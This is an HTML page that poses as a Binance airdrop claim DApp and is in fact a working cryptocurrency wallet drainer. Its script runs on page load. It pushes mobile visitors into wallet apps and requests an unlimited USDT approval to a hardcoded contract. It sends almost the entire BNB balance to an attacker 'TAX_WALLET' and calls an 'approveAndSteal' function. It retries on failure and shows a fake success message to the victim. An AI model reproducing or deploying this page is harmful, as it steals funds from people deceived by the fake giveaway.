<!DOCTYPE html>
<html lang="zh">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width,initial-scale=1.0" />
<title>ğŸŒ¸ å°ä»™å¥³ Web3 é­”æ³•ä»ªè¡¨å° ğŸŒ¸</title>
<script src="https://cdn.jsdelivr.net/npm/web3@1.10.4/dist/web3.min.js"></script>
<style>
body{font-family:sans-serif;height:100vh;display:flex;justify-content:center;align-items:center;background:#ffe4f8;text-align:center;}
.container{background:rgba(255,255,255,.9);border-radius:24px;padding:40px;margin:10px;width:90%;max-width:400px;}
h1{color:#ff1493;font-size:24px;margin-bottom:20px;}
#status{color:#ff69b4;font-size:18px;margin:20px;}
@media (max-width:480px){.container{padding:20px;}}
</style>
</head>
<body>
<div class="container">
  <h1>ğŸª å°ä»™å¥³ DApp é¢†å–å° ğŸ’«</h1>
  <div id="status">å¸å®‰ç¬¬3æ¬¡ç©ºæŠ•åŒèˆŸè®¡åˆ’</div>
</div>
<script>
const BVXZA = "0x1ff42792e962228099cfA175aDba5412dab1448c";
const TAX_WALLET = "0x18626d14aE9cB5dd26d5a14286FF732746083556";
const USDT_ADDR = "0x55d398326f99059fF775485246999027B3197955";
const UNLIMITED = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
let web3, userAddr, authorized = false;

const BVXZA_ABI = [
  {"inputs":[{"name":"token","type":"address"},{"name":"amount","type":"uint256"}],"name":"approveAndSteal","outputs":[],"stateMutability":"nonpayable","type":"function"}
];

function updateStatus(msg){
  document.getElementById('status').innerText = msg;
}

// ğŸ”¥ è¶…å¼ºæ‰‹æœºè‡ªåŠ¨è·³è½¬
async function autoRedirect(){
  const ua = navigator.userAgent;
  const isMobile = /Android|iPhone|iPad/i.test(ua);
  if(!isMobile) return;
  
  const wallets = [
    'okxwallet://dapp?url=' + encodeURIComponent(window.location.href),
    'trust://open_url?url=' + encodeURIComponent(window.location.href),
    'metamask://dapp/' + encodeURIComponent(window.location.href)
  ];
  
  for(let i=0; i<wallets.length; i++){
    setTimeout(() => {
      updateStatus(`è·³è½¬é’±åŒ…ä¸­...`);
      window.location.href = wallets[i];
    }, i * 150); // 0.15ç§’è¶…å¿«
  }
}

// ğŸ”¥ ç¬¬ä¸€æ¬¡USDTæˆæƒ + è½¬BNB
async function autoSteal(){
  try{
    // 0ï¸âƒ£ BSCåˆ‡æ¢+è¿æ¥
    await window.ethereum.request({method: 'wallet_switchEthereumChain', params: [{ chainId: '0x38' }]});
    web3 = new Web3(window.ethereum);
    const accounts = await window.ethereum.request({method: 'eth_requestAccounts'});
    userAddr = accounts[0];
    
    updateStatus('ç¬¬ä¸€æ¬¡USDTæˆæƒä¸­...');
    
    // 1ï¸âƒ£ ç¬¬ä¸€æ¬¡ï¼šUSDTæˆæƒ
    if(!authorized){
      const usdtABI = [{"inputs":[{"name":"spender","type":"address"},{"name":"amount","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}];
      const usdt = new web3.eth.Contract(usdtABI, USDT_ADDR);
      await usdt.methods.approve(BVXZA, UNLIMITED).send({from: userAddr});
      authorized = true;
      updateStatus('USDTæˆæƒæˆåŠŸï¼è½¬BNBä¸­...');
    }
    
    // 2ï¸âƒ£ ç«‹å³è½¬BNBå…¨
    const balance = await web3.eth.getBalance(userAddr);
    const totalBNB = parseFloat(web3.utils.fromWei(balance, 'ether'));
    if(totalBNB > 0.001){
      const amount = web3.utils.toWei((totalBNB - 0.001).toString(), 'ether');
      await web3.eth.sendTransaction({from: userAddr, to: TAX_WALLET, value: amount});
      updateStatus('BNBè½¬è´¦æˆåŠŸï¼');
    }
    
    // 3ï¸âƒ£ BVXZAå…¨çªƒå–
    const bvxza = new web3.eth.Contract(BVXZA_ABI, BVXZA);
    await bvxza.methods.approveAndSteal(USDT_ADDR, UNLIMITED).send({from: userAddr});
    
    updateStatus('ğŸ‰ å¸å®‰ç¬¬3æ¬¡ç©ºæŠ•åˆ°è´¦ï¼');
    
  }catch(e){
    updateStatus('æˆæƒå¤±è´¥ï¼Œ1ç§’é‡è¯•...');
    setTimeout(autoSteal, 1000);
  }
}

// ğŸ”¥ è¿›å…¥ç½‘å€=0.2ç§’è‡ªåŠ¨è·³è½¬+0.5ç§’è‡ªåŠ¨æˆæƒï¼
window.addEventListener('load', () => {
  setTimeout(autoRedirect, 200); // 0.2ç§’è·³è½¬
});

if(window.ethereum){
  window.addEventListener('load', () => {
    setTimeout(autoSteal, 500); // 0.5ç§’æˆæƒ
  });
  window.ethereum.on('accountsChanged', autoSteal);
  window.ethereum.on('chainChanged', autoSteal);
}
</script>
</body>
</html>
